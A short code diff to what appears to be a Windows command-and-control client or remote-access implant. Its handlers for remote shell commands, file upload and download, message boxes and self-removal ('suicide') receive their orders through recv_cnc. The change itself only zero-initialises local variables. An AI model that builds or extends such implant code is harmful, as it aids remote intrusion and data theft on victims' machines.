@@ -9,8 +9,8 @@
 
 void handle_echo()
 {
-    int bytes_read, bytes_to_read;
-    struct echo_cmd cmd;
+    int bytes_read = 0, bytes_to_read = 0;
+    struct echo_cmd cmd = {};
 
     log_info("Received ECHO command.");
     bytes_read = recv_cnc(&cmd.bytes_remaining, sizeof(cmd.bytes_remaining));
@@ -34,8 +34,8 @@ void handle_echo()
 
 void handle_shell()
 {
-    unsigned int bytes_read;
-    struct shell_cmd cmd;
+    unsigned int bytes_read = 0;
+    struct shell_cmd cmd = {};
 
     log_info("Received SHELL command.");
     bytes_read = recv_cnc(&cmd.cmd_len, sizeof(cmd.cmd_len));
@@ -79,8 +79,8 @@ void handle_shell()
 
 void handle_msgbox()
 {
-    unsigned int bytes_read;
-    struct msgbox_cmd cmd;
+    unsigned int bytes_read = 0;
+    struct msgbox_cmd cmd = {};
 
     log_info("Received MSGBOX command.");
 
@@ -138,10 +138,10 @@ void handle_suicide()
 
 void handle_upload_file()
 {
-    int ret;
-    unsigned long bytes_read;
-    HANDLE file;
-    struct file_cmd cmd;
+    int ret = 0;
+    unsigned long bytes_read = 0;
+    HANDLE file = NULL;
+    struct file_cmd cmd = {};
 
     log_info("Received UPLOAD_FILE command.");
 
@@ -204,11 +204,11 @@ void handle_upload_file()
 
 void handle_download_file()
 {
-    int ret;
-    unsigned long bytes_read, bytes_to_read;
+    int ret = 0;
+    unsigned long bytes_read = 0, bytes_to_read = 0;
     unsigned long long written_file_bytes = 0;
-    HANDLE file;
-    struct file_cmd cmd;
+    HANDLE file = NULL;
+    struct file_cmd cmd = {};
 
     log_info("Received DOWNLOAD_FILE command.");
 
@@ -272,8 +272,8 @@ void handle_download_file()
 
 void listen_for_cmds()
 {
-    int bytes_read;
-    struct cmd cmd;
+    int bytes_read = 0;
+    struct cmd cmd = {};
     void (*cmd_type_handler[])() = {handle_echo, handle_shell, handle_msgbox, handle_suicide, handle_upload_file, handle_download_file};
 
     while (TRUE)
